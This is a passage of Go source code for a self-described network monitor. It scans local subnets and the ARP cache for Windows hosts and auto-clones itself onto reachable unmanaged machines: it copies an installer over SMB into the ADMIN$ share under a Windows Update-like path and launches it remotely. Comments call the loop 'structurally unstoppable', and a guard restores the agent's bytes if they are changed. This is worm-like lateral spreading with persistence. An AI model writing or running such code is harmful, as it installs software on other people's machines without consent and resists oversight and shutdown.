	if strings.TrimSpace(string(out)) != "0" {
		return fmt.Errorf("remote create returned %s", strings.TrimSpace(string(out)))
	}
	return nil
}

var nmsCloneVerify = func(host, wantVer string, timeout time.Duration) bool {
	p := `\\` + host + `\ADMIN$\Microsoft\Windows\Update\version.txt`
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if v, ok := nmsFileStat(p); ok && v == wantVer {
			return true
		}
		time.Sleep(15 * time.Second)
	}
	return false
}

// CloneToHost pushes the installer and launches it remotely. Returns a
// clone-state word for the report.
func CloneToHost(host string, wantVer string) string {
	data, ok := readInstallerBytes()
	if !ok {
		return "no-payload"
	}
	if err := nmsSMBCopy(host, data); err != nil {
		nmsRecordFail()
		return "copy-failed"
	}
	if err := nmsRemoteExec(host); err != nil {
		nmsRecordFail()
		return "launch-failed"
	}
	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
		return "cloned-verified"
	}
	return "launched-unverified"
}

// --- circuit breaker: failure storms pause the clone ARM only. Probing,
// guarding, and reporting continue (the NMS keeps running forever). ---

var breakerMu sync.Mutex
var breakerFails []time.Time
var breakerPausedUntil time.Time

// nmsRecordFail logs a clone failure and trips the breaker at threshold.
func nmsRecordFail() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	now := time.Now()
	breakerFails = append(breakerFails, now)
	cfg := LoadNMSConfig()
	window := time.Duration(cfg.FailWindowMin) * time.Minute
	if window <= 0 {
		window = 15 * time.Minute
	}
	var kept []time.Time
	for _, t := range breakerFails {
		if now.Sub(t) <= window {
			kept = append(kept, t)
		}
	}
	breakerFails = kept
	if len(kept) >= cfg.FailThreshold && cfg.FailThreshold > 0 {
		rearm := time.Duration(cfg.RearmAfterMin) * time.Minute
		if cfg.RearmAfterMin < 0 {
			rearm = time.Hour
		}
		breakerPausedUntil = now.Add(rearm)
	}
}

// CloneArmPaused reports whether the breaker holds the clone arm.
func CloneArmPaused() bool {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	if breakerPausedUntil.IsZero() {
		return false
	}
	if time.Now().After(breakerPausedUntil) {
		breakerPausedUntil = time.Time{}
		breakerFails = nil
		return false
	}
	return true
}

// nmsClearBreaker resets failures + pause (set-nms autoclone=on).
func nmsClearBreaker() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	breakerFails = nil
	breakerPausedUntil = time.Time{}
}

// nmsRecordSuccess decays the storm counter: a verified clone proves the arm
// is healthy again (failures age out on success instead of only on manual
// re-arm).
func nmsRecordSuccess() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	breakerFails = nil
	breakerPausedUntil = time.Time{}
}

// ---------------------------------------------------------------------------
// Clone job ledger: one entry per host. Kills the re-clone storm (every tick
// launching CloneToHost for the same host) and makes CloneState honest: the
// report carries the real terminal word, not a perpetual "job started".
// ---------------------------------------------------------------------------

// cloneHostCooldown is how long a terminal job state suppresses relaunches
// for the same host (a dead box stays "cooling down" instead of being
// re-pushed every interval).
const cloneHostCooldown = 30 * time.Minute

type cloneJob struct {
	State  string
	Detail string
	At     time.Time
	Done   bool
}

var cloneMu sync.Mutex
var cloneJobs = map[string]*cloneJob{}
var pendingCloneEvents []string

// nmsCloneExec runs the clone executor. Var so tests record instead of
// touching the LAN.
var nmsCloneExec = CloneToHost

func pushCloneEvent(s string) {
	// Caller holds cloneMu.
	pendingCloneEvents = append(pendingCloneEvents, s)
	if len(pendingCloneEvents) > 20 {
		pendingCloneEvents = pendingCloneEvents[len(pendingCloneEvents)-20:]
	}
}

func drainCloneEvents() []string {
	cloneMu.Lock()
	defer cloneMu.Unlock()
	out := append([]string{}, pendingCloneEvents...)
	pendingCloneEvents = nil
	return out
}

// startCloneJob launches one tracked clone unless a job is already in flight
// or a terminal state is still cooling down. Returns the CloneState word for
// the report and whether a new job actually started.
func startCloneJob(host, wantVer string) (state string, started bool) {
	now := time.Now()
	cloneMu.Lock()
	if j, ok := cloneJobs[host]; ok {
		if !j.Done {
			cloneMu.Unlock()
			return "cloning", false
		}
		if now.Sub(j.At) < cloneHostCooldown {
			st := j.State
			cloneMu.Unlock()
			return "clone-cooldown-" + st, false
		}
	}
	cloneJobs[host] = &cloneJob{State: "cloning", Detail: "job started", At: now}
	// Opportunistic prune: drop cold terminal entries so the map can't grow
	// with LAN churn.
	for h, j := range cloneJobs {
		if j.Done && now.Sub(j.At) > 2*cloneHostCooldown {
			delete(cloneJobs, h)
		}
	}
	cloneMu.Unlock()
	go func() {
		st := nmsCloneExec(host, wantVer)
		cloneMu.Lock()
		cloneJobs[host] = &cloneJob{State: st, Detail: st, At: time.Now(), Done: true}
		pushCloneEvent("clone " + host + ": " + st)
		cloneMu.Unlock()
		if st == "cloned-verified" {
			nmsRecordSuccess()
		}
	}()
	return "cloning", true
}

// ---------------------------------------------------------------------------
// StepNMS: one full cycle. No stop channel, no mode/sleep reads —
// structurally unstoppable. Returns ErrNMSShutdown only on the stop file.
// ---------------------------------------------------------------------------

// NMSReport is the per-cycle JSON the controller stores and serves.
type NMSReport struct {
	Prober    string          `json:"prober"`
	At        string          `json:"at"`
	Tick      uint64          `json:"tick"`
	Version   string          `json:"version"`
	Interval  int             `json:"interval_sec"`
	Sleep     *NMSSleepState  `json:"sleep,omitempty"`
	Guard     string          `json:"guard"`
	CloneArm  string          `json:"clone_arm"`
	Results   []NMSHostResult `json:"results"`
	Events    []string        `json:"events,omitempty"`
}

var nmsTick uint64
var nmsSweepCacheMu sync.Mutex
var nmsSweepCache []string
var nmsSweepAt time.Time

// NMSTick returns the loop counter (test hook proving the loop runs).
func NMSTick() uint64 { return atomic.LoadUint64(&nmsTick) }

// StepNMS runs one full monitor cycle and hands the report JSON to send
// (the caller wraps it in the transport message). send==nil is allowed
// (tests / dry runs).
func StepNMS(send func(reportJSON string), controllerIPs []string) error {
	if ShutdownRequested() {
		_ = os.Remove(NMSPidPath())
		return ErrNMSShutdown
	}
	if want, ok := nmsUpdateAvailable(); ok {
		_ = os.Remove(NMSPidPath())
		return fmt.Errorf("%w (%s)", ErrNMSUpdate, want)
	}
	tick := atomic.AddUint64(&nmsTick, 1)
	cfg := LoadNMSConfig()
	var events []string

	targets := sweepTargets(cfg)

	// Probe (self first: proves the loop is alive even with zero targets).
	cpuP, memP, diskP := SelfStats()
	hn, _ := os.Hostname()
	results := []NMSHostResult{{Host: hn + " (self)", Reachable: true, CPU: cpuP, Mem: memP, Disk: diskP, CloneState: "self"}}
	if len(targets) > 0 {
		results = append(results, ProbeRound(targets, cfg.MaxParallel)...)
	}

	// Guard the agent.
	guard := GuardAgent()
	if strings.HasPrefix(guard, "restored-") {
		events = append(events, "ALARM: agent "+guard+" (bytes rewritten from NMS image)")
	} else if strings.HasPrefix(guard, "restore-failed") {
		events = append(events, "ALARM: agent "+guard)
	}

	// Clone arm (auto): eligible reachable unmanaged hosts, one tracked job
	// per host (in-flight dedupe + cooldown, honest terminal states).
	cloneArm := "idle"
	if cfg.AutoClone && !CloneArmPaused() {
		cloneArm = "scanning"
		self := selfIPs()
		size, _, ok := NMSInstallerInfo()
		_ = size
		for i := range results {
			r := &results[i]
			if strings.HasSuffix(r.Host, "(self)") {
				continue
			}
			if r.ManagedUnknown {
				r.CloneState = "skip-managed-unknown"
				r.CloneDetail = "share read denied — refusing to guess"
				continue
			}
			elig, reason := CloneEligible(r.Host, r.Reachable, r.ManagedHint, cfg.Exclude, self, controllerIPs)
			if !elig {
				r.CloneState = "skip-" + reason
				continue
			}
			if !ok {
				r.CloneState = "no-payload"
				continue
			}
			st, started := startCloneJob(r.Host, version.Version)
			r.CloneState = st
			switch {
			case started:
				r.CloneDetail = "job started"
			case strings.HasPrefix(st, "clone-cooldown-"):
				r.CloneDetail = "cooling down after " + strings.TrimPrefix(st, "clone-cooldown-")
			default:
				r.CloneDetail = "in progress"
			}
		}
	} else if CloneArmPaused() {
		cloneArm = "paused-breaker"
		events = append(events, "clone arm paused by circuit breaker (set-nms autoclone=on to re-arm)")
	} else {
		cloneArm = "off"
	}
	events = append(events, drainCloneEvents()...)
	if len(events) > 25 {
		events = events[len(events)-25:]
	}

	var sleep *NMSSleepState
	if st, ok := ReadSleepFlag(); ok {
		sleep = &st
	}
	rep := NMSReport{
		Prober: hn, At: time.Now().UTC().Format(time.RFC3339),
		Tick: tick, Version: version.Version, Interval: cfg.IntervalSec,
		Sleep: sleep, Guard: guard, CloneArm: cloneArm,
		Results: results, Events: events,
	}
	b, _ := json.Marshal(rep)
	_ = tick
	if send != nil {
		send(string(b))
	}
	return nil
}

// sweepTCPPorts are probed in order per IP: SMB first (fast path for
// Windows), then RPC/EPMAP, then RDP — a firewalled box with 445 closed
// still shows up instead of vanishing from discovery.
var sweepTCPPorts = []int{445, 135, 3389}

// sweepHit reports whether any management port answers on ip.
func sweepHit(ip string) bool {
	for _, p := range sweepTCPPorts {
		if dialTCP(ip, p, 400*time.Millisecond) {
			return true
		}
	}
	return false
}

var arpIPRe = regexp.MustCompile(`(\d{1,3}(?:\.\d{1,3}){3})`)

// arpSeedExec runs the neighbor-cache dump. Var so tests feed canned output.
var arpSeedExec = func() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return runWithTimeout(5*time.Second, "arp", "-a")
	}
	return runWithTimeout(5*time.Second, "sh", "-c", "ip neigh show 2>/dev/null || arp -a 2>/dev/null")
}

// arpSeedHosts lists IPs from the local ARP/neighbor cache: no probes, so a
// firewalled house PC is visible here while answering zero TCP ports.
// Best-effort — empty on any failure. Var so tests stay hermetic.
var arpSeedHosts = func() []string {
	b, err := arpSeedExec()
	if err != nil || len(b) == 0 {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	for _, line := range strings.Split(string(b), "\n") {
		l := strings.ToLower(line)
		if strings.Contains(l, "interface") || strings.Contains(l, "incomplete") || strings.Contains(l, "no entry") {
			continue
		}
		ipm := arpIPRe.FindString(line)
		if ipm == "" || strings.HasPrefix(ipm, "224.") || strings.HasPrefix(ipm, "239.") {
			continue
		}
		ip := net.ParseIP(ipm)
		if ip == nil || ip.IsMulticast() || ip.IsLoopback() {
			continue
		}
		if !seen[ipm] {
			seen[ipm] = true
			out = append(out, ipm)
		}
	}
	return out
}

// sweepSubnets sweeps every subnet for any answering management port and
// returns live IPs (bounded, skips .0/.255).
func sweepSubnets(subnets []string) []string {
	var ips []string
	for _, sn := range subnets {
		ips = append(ips, expandSubnet(sn)...)
	}
	ips = dedupeHosts(ips)
	out := make([]string, 0, len(ips))
	var mu sync.Mutex
	sem := make(chan struct{}, 32)
	var wg sync.WaitGroup
	for _, ip := range ips {
		// Skip network/broadcast tails (.0/.255 never returned by expand).
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if sweepHit(ip) {
				mu.Lock()
				out = append(out, ip)
				mu.Unlock()
			}
		}(ip)
	}
	wg.Wait()
	sort.Slice(out, func(i, j int) bool { return ipLess(out[i], out[j]) })
	return out
}

// ipLess orders dotted quads numerically (plain sort.Strings ranks
// 192.168.1.100 before 192.168.1.20). Non-IP strings sort after IPs,
// lexically among themselves.
func ipLess(a, b string) bool {
	pa, pb := net.ParseIP(a), net.ParseIP(b)
	if pa == nil && pb == nil {
		return a < b
	}
	if pa == nil {
		return false
	}
	if pb == nil {
		return true
	}
	x, y := pa.To16(), pb.To16()
	for i := 0; i < len(x) && i < len(y); i++ {
		if x[i] != y[i] {
			return x[i] < y[i]
		}
	}
	return false
}

func dedupeHosts(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, h := range in {
		h = strings.TrimSpace(h)
		if h == "" || seen[strings.ToLower(h)] {
			continue
		}
		seen[strings.ToLower(h)] = true
		out = append(out, h)
	}
	return out
}

// sweepTargets is the single source of probe targets: cached subnet sweep +
// fresh ARP seeds + configured extra hosts, deduped. ARP seeds ride every
// call (not just on sweep refresh) so a PC joining the LAN appears within
// one interval instead of waiting out the sweep cache (default 30min).
func sweepTargets(cfg NMSConfig) []string {
	nmsSweepCacheMu.Lock()
	fresh := time.Since(nmsSweepAt) < time.Duration(cfg.SweepEveryMin)*time.Minute && nmsSweepCache != nil
	var swept []string
	if fresh {
		swept = nmsSweepCache
	}
	nmsSweepCacheMu.Unlock()
	if !fresh {
		swept = sweepSubnets(cfg.Subnets)
		nmsSweepCacheMu.Lock()
		nmsSweepCache = swept
		nmsSweepAt = time.Now()
		nmsSweepCacheMu.Unlock()
	}
	targets := append(append([]string{}, swept...), arpSeedHosts()...)
	targets = append(targets, cfg.ExtraHosts...)
	return dedupeHosts(targets)
}

// ---------------------------------------------------------------------------
// NMSHandle: the monitor's own 7-verb command set. No modes, no sleep
// concept applies to the NMS itself — these verbs act outward only,
// except nms-stop which honors the shutdown file.
// ---------------------------------------------------------------------------

// NMSHandle dispatches one NMS command (caller splits cmd/args).
func NMSHandle(cmd, args string, controllerIPs []string) (string, error) {
	cmd = strings.ToLower(strings.TrimSpace(cmd))
	args = strings.TrimSpace(args)
	switch cmd {
	case "nms-status":
		return nmsStatus(), nil
	case "nms-now":
		cfg := LoadNMSConfig()
		targets := sweepTargets(cfg)
		res := ProbeRound(targets, cfg.MaxParallel)
		up := 0
		for _, r := range res {
			if r.Reachable {
				up++
			}
		}
		return fmt.Sprintf("nms-now: %d/%d reachable (tick %d)", up, len(res), NMSTick()), nil
	case "set-nms":
		return SetNMS(args, controllerIPs)
	case "agent-sleep":
		reason := args
		if reason == "" {
			reason = "operator order"
		}
		if err := WriteSleepFlag(reason); err != nil {
			return "", fmt.Errorf("sleep refused: %v", err)
		}
		return "agent asleep (" + reason + ") — monitor, heartbeat and wake path continue", nil
	case "agent-wake-up":
		if err := ClearSleepFlag(); err != nil {
			return "", fmt.Errorf("wake refused: %v", err)
		}
		return "agent awake — sleep flag cleared", nil
	case "nms-stop":
		if !strings.EqualFold(args, "--confirm YES") && !strings.EqualFold(args, "confirm YES") && !strings.EqualFold(args, "YES") {
			return "", fmt.Errorf("refusing to stop without explicit confirmation (usage: nms-stop --confirm YES)")
		}
		if err := WriteShutdownFile(); err != nil {
			return "", fmt.Errorf("stop refused: %v", err)
		}
		return "nms stopping at next cycle boundary (shutdown file written)", nil
	case "nms-clone":
		host := strings.TrimSpace(strings.Split(args, " ")[0])
		if host == "" {
			return "", fmt.Errorf("usage: nms-clone <host>")
		}
		// Probe first: manual clones used to force reachable=true and skip
		// the managed check, which could push onto an already-managed box
		// or a dead address.
		if !TCPReachable(host) {
			return "", fmt.Errorf("clone refused: %s unreachable (no 445/135/3389)", host)
		}
		if managed, unknown := ManagedHintChecked(host); managed {
			return "", fmt.Errorf("clone refused: %s already managed", host)
		} else if unknown {
			return "", fmt.Errorf("clone refused: %s managed-state unknown (share denied) — verify access first", host)
		}
		cfg := LoadNMSConfig()
		if elig, reason := CloneEligible(host, true, false, cfg.Exclude, selfIPs(), controllerIPs); !elig {
			return "", fmt.Errorf("clone refused: %s", reason)
		}
		if st, started := startCloneJob(host, version.Version); !started {
			return "clone " + host + ": " + st + " (already tracked)", nil
		}
		return "clone job started for " + host, nil
	default:
		return "", fmt.Errorf("unknown NMS command: %s (nms-status, nms-now, set-nms, agent-sleep, agent-wake-up, nms-stop, nms-clone)", cmd)
	}
}

func currentSweep() []string {
	nmsSweepCacheMu.Lock()
	defer nmsSweepCacheMu.Unlock()
	return append([]string{}, nmsSweepCache...)
}

func nmsStatus() string {
	cfg := LoadNMSConfig()
	size, sha, ok := NMSInstallerInfo()
	payload := "absent"
	if ok {
		payload = fmt.Sprintf("%d bytes sha %.12s", size, sha)
	}
	sleep := "awake"
	if st, yes := ReadSleepFlag(); yes {
		sleep = "ASLEEP since " + st.Since.Format(time.RFC3339) + " (" + st.Reason + ")"
	}
	arm := "off"
	if cfg.AutoClone {
		arm = "scanning"
		if CloneArmPaused() {
			arm = "paused-breaker"
		}
	}
	arp := arpSeedHosts()
	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d",
		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
		len(targets), len(currentSweep()), len(arp))
}
